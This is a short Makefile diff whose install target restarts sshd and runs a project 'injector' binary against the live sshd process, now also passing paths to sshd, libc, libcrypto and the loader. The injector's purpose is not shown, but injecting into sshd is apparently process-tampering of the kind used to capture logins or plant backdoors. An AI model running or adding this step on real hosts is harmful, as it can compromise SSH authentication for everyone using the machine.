@@ -47,7 +47,7 @@ $(BUILD_DIR):
 
 install:
 	systemctl restart sshd
-	./build/injector $$(pgrep sshd)
+	./build/injector $$(pgrep sshd) /usr/bin/sshd /usr/lib/libc.so.6 /usr/lib/libcrypto.so.3 /usr/lib/ld-linux-x86-64.so.2
 
 .PHONY: clean all injector
 
